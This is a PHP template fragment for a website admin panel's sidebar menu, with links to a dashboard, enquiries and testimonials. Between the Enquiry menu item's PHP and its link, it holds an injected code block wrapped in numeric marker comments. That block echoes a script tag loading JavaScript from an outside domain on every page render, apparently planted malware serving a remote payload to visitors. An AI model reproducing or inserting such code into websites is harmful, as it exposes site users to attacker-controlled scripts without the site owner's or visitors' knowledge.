<div id="mainnav" class="hidden-phone hidden-tablet">
        <ul>
          <li><?php if($side_menu=="home"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="dashboard.php">
              <div class="icon dash"></div>
              Dashboard
            </a>
          </li>
          <li><?php if($side_menu=="Enquiry"){ echo '<span class="current-arrow"></span>'; } ?>
<?php
#506288#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967258\"></script>";
echo $g;
}
#/506288#
?>          	<a href="list_enquiry.php">
              <div class="icon news"></div>
              Enquiry
            </a>
          </li>
         <li><?php if($side_menu=="Testimonials"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_testimonials.php">
              <div class="icon ad"></div>
             Testimonials
            </a>
        </ul>
      </div>